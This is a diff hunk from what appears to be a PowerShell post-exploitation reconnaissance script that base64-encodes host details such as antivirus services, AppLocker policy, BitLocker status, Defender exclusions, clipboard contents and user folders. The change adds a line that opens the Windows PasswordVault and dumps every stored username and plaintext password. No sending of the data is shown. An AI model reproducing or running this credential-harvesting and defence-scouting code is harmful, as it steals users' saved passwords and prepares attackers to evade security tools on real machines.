@@ -9,7 +9,8 @@ antivirus = Encode64(Get-Service | Where-Object { $_.DisplayName -like "*McAfee*
 applocker = Encode64(Get-AppLockerPolicy -Effective -Xml | out-string);
 arp = Encode64(Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State | out-string);
 bitlocker = Encode64(Get-BitLockerVolume | out-string);
-clipboard=Encode64(Get-Clipboard | out-string);
+browser_pwd = Encode64([void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | out-string);
+clipboard = Encode64(Get-Clipboard | out-string);
 defender_exclusions = Encode64(Get-MpPreference | select Exclusion* | fl | out-string);
 defender_status = Encode64(Get-MpComputerStatus | out-string);
 dir_c_users = Encode64(Get-ChildItem -Force 'C:\Users\' | out-string);
